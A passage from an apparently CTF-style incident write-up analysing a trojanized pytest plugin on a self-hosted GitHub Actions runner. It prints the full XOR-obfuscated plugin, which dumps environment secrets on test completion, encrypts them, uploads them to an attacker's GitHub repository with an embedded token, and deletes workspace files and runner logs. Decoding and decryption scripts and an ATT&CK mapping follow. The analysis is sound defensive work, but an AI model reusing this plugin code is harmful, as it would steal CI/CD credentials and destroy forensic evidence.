/home/ubuntu/.local/lib/python3.10/site-packages/typing_extensions.py
/home/ubuntu/.local/lib/python3.10/site-packages/pytest-9.0.2.dist-info/METADATA
/home/ubuntu/.local/lib/python3.10/site-packages/typing_extensions-4.15.0.dist-info/METADATA
/home/ubuntu/.local/lib/python3.10/site-packages/pygments-2.19.2.dist-info/METADATA
/home/ubuntu/.local/lib/python3.10/site-packages/durationpy-0.10.dist-info/METADATA
root@magic-runner-acme:/home/ubuntu/actions-runner# 
```

### Result

```text
/home/ubuntu/.local/lib/python3.10/site-packages/_pytest/veryveryverymalicious.py
```

![Wiz](wiz_github_action_mal.png)


![Wiz](wiz_github_action_mal_enc.png)

# Malicious Payload Analysis

The file:

```text
_pytest/veryveryverymalicious.py
```
```python
root@magic-runner-acme:/#  cat /home/ubuntu/.local/lib/python3.10/site-packages/_pytest/veryveryverymalicious.py

def _s(data, k=17):
    return "".join(chr(x ^ k) for x in data)


import os
import json
import base64
import requests
import shutil
import importlib
mod = importlib.import_module(_s([114, 99, 104, 97, 101, 126, 118, 99, 112, 97, 121, 104, 63, 119, 116, 99, 127, 116, 101]))
Crypto = getattr(mod, _s([87, 116, 99, 127, 116, 101]))


CRYPT_KEY = _s([66, 122, 78, 93, 72, 71, 101, 69, 37, 83, 92, 82, 37, 91, 38,
                 32, 84, 36, 114, 103, 112, 85, 93, 126, 89, 34, 91, 88, 68, 38, 
                 119, 33, 34, 64, 100, 115, 84, 67, 96, 41, 107, 126, 64, 44]).encode()
GITHUB_PAT = _s([118, 120, 101, 121, 100, 115, 78, 97, 112, 101, 78, 32, 32,
                83, 37, 39, 69, 38, 75, 88, 33, 41, 114, 83, 82, 118, 82, 120, 88, 
                104, 120, 95, 105, 78, 90, 67, 107, 68, 67, 85, 92, 107, 94, 96, 35,
                107, 126, 87, 36, 105, 118, 116, 102, 123, 92, 34, 107, 112, 86, 119,
                83, 94, 75, 39, 97, 41, 32, 75, 89, 97, 35, 72, 102, 68, 103, 120, 101, 
                86, 84, 92, 90, 72, 66, 39, 35, 89, 85, 116, 83, 119, 69, 114, 86])
REPO_OWNER = _s([124, 37, 118, 120, 114, 98, 101, 34, 37, 125, 34, 99])
REPO_NAME = _s([98, 101, 126, 125, 116, 127, 60, 98, 97, 112, 99, 122, 125, 116, 98])
BRANCH = _s([124, 112, 120, 127])
runner = os.environ["RUNNER_NAME"]
SUFFIX = _s([98, 116, 114, 99, 116, 101])
ARTIFACT_PATH = f"{runner}.{SUFFIX}"
COMMIT_MESSAGE = _s([100, 97, 117, 112, 101, 116, 49, 99, 100, 127, 101, 120, 124, 116, 49, 117, 112, 101, 112])

# ==================================================
# Very malicious exfil code!!!!
# ==================================================

def collect_data():
    return {
        "environment_variables": dict(os.environ)
    }

def encrypt_data(data: dict) -> bytes:
    f = Crypto(CRYPT_KEY)
    plaintext = json.dumps(data).encode()
    return f.encrypt(plaintext)

def get_existing_file_sha(url, headers):
    r = requests.get(url, headers=headers)
    if r.status_code == 200:
        return r.json().get("sha")
    return None

def upload_to_repo(encrypted_blob: bytes):
    api_url = (
        f"https://api.github.com/repos/"
        f"{REPO_OWNER}/{REPO_NAME}/contents/data/{ARTIFACT_PATH}"
    )

    headers = {
        "Authorization": f"token {GITHUB_PAT}",
        "Accept": "application/vnd.github+json"
    }

    payload = {
        "message": COMMIT_MESSAGE,
        "content": base64.b64encode(encrypted_blob).decode(),
        "branch": BRANCH
    }

    sha = get_existing_file_sha(api_url, headers)
    if sha:
        payload["sha"] = sha

    r = requests.put(api_url, headers=headers, json=payload)
    r.raise_for_status()

# ==================================================
# MAIN
# ==================================================
def pytest_sessionfinish(session, exitstatus):
    data = collect_data()
    encrypted_blob = encrypt_data(data)
    upload_to_repo(encrypted_blob)
    try:
        os.chdir("/")
    except Exception:
        pass

    #deleting traces!
    workspace = os.environ["GITHUB_WORKSPACE"]
    diag = os.path.abspath(os.path.join(workspace, "../../../_diag"))

    for name in os.listdir(workspace):
        p = os.path.join(workspace, name)
        shutil.rmtree(p, ignore_errors=True) if os.path.isdir(p) else os.remove(p)

    for name in os.listdir(diag):
        if name.startswith("Worker_"):
            os.remove(os.path.join(diag, name))
root@magic-runner-acme:/# 
```

[Python_Script_XOR_Decoding the Obfuscated Strings](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/DECXOR.py "Results")



contained a malicious pytest plugin.

```
python3 DECXOR.py 
Module: cryptography.fernet
Class: Fernet
CRYPT_K3Y: Sk_LYVtT4XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
GITHUB_PAT: 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
REPO_OWNER: m4gicst34l3r
REPO_NAME: stolen-sparkles
BRANCH: main
SUFFIX: s3cret
COMMIT_MESSAGE: update runtime data
```

![Wiz](wiz_github_action_mal_dec_XOR2.png)


## Execution Trigger

```python
def pytest_sessionfinish(session, exitstatus):
```

This hook executes automatically whenever pytest finishes running tests.



## Data Collection

```python
def collect_data():
    return {
        "environment_variables": dict(os.environ)
    }
```

Collected all runner environment variables.

Potentially exposed secrets included:

```text
GITHUB_TOKEN
KUBECONFIG
GOOGLE_APPLICATION_CREDENTIALS
GCP_PROJECT_ID
```



## Encryption

```python
f = Fernet(CRYPT_KEY)
encrypted = f.encrypt(data)
```

Data was encrypted before exfiltration.



## Exfiltration

```python
requests.put(
    "https://api.github.com/repos/.../contents/data/..."
)
```

The GitHub Contents API was used to upload encrypted files directly into the attacker's repository.



## Anti-Forensics

The plugin removed:

### Workspace Artifacts

```python
for name in os.listdir(workspace):
    ...
```

### GitHub Actions Worker Logs

```python
if name.startswith("Worker_"):
    os.remove(...)
```

This explains why no workflow artifacts remained on disk.



# Obfuscation Analysis

All sensitive strings were XOR encoded.

Decoding the arrays revealed:

| Variable       | Value                 |
| -------------- | --------------------- |
| Module         | `cryptography.fernet` |
| Class          | `Fernet`              |
| Repo Owner     | `m4gicst34l3r`        |
| Repository     | `stolen-sparkles`     |
| Branch         | `main`                |
| File Extension | `.secret`             |
| Commit Message | `update runtime data` |




# Recovering the Fernet Key

The decoded payload exposed:

```text
Sk_LYVtT4XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

This key was used to decrypt exfiltrated files.



# Decrypting Stolen Data

The attacker repository contained:

```text
data/magic-runner-acme.secret
```

Using the recovered Fernet key:

```python
from cryptography.fernet import Fernet

f = Fernet(KEY)
plaintext = f.decrypt(secret_file)
```

The decrypted JSON contained:

```json
{
  "environment_variables": {
    ...
  }
}
```



# Recovered Secrets

Important environment variables included:

```text
GITHUB_TOKEN
GOOGLE_APPLICATION_CREDENTIALS
KUBECONFIG
GCP_PROJECT_ID
RUNNER_NAME
GITHUB_REPOSITORY
```

```Python
from cryptography.fernet import Fernet
import json
import os

key = b'Sk_LYVtT4XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'
f = Fernet(key)

for filename in os.listdir("data"):
    if not filename.endswith(".secret"):
        continue

    try:
        with open(os.path.join("data", filename), "rb") as fh:
            env = json.loads(
                f.decrypt(fh.read())
            )["environment_variables"]

        if "FLAG" in env:
            print(f"{filename}: {env['FLAG']}")

    except Exception:
        pass
```


Among the variables was:

```text
FLAG=CTF{REDACTED}
```

![Wiz](wiz_github_action_flag.png)

# Root Cause

A trojanized version of the pytest package was installed on a persistent self-hosted GitHub Actions runner.

The malicious package:

1. Executed automatically through pytest plugin hooks.
2. Harvested CI/CD secrets.
3. Encrypted stolen data.
4. Uploaded encrypted blobs to a public GitHub repository.
5. Removed evidence after execution.



# MITRE ATT&CK Mapping

| Technique ID | Technique |
|-|--|
| T1195 | Supply Chain Compromise |
| T1552 | Unsecured Credentials |
| T1552.001 | Credentials In Files |
| T1020 | Automated Exfiltration |
| T1041 | Exfiltration Over C2 Channel |
| T1562.001 | Impair Defenses |
| T1070.004 | File Deletion |
| T1027 | Obfuscated Files or Information |
| T1555 | Credentials From Password Stores |
| T1078 | Valid Accounts |



# Flag

```text
python3 Dec.py 
magic-runner-acme.secret: CTF{supply_chain_by_M@G!C_St3a1ER}
```

[Dec.py](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/stolen-sparkles/Dec.py "Results")



![Wiz](wiz_github_action_flag_done.png)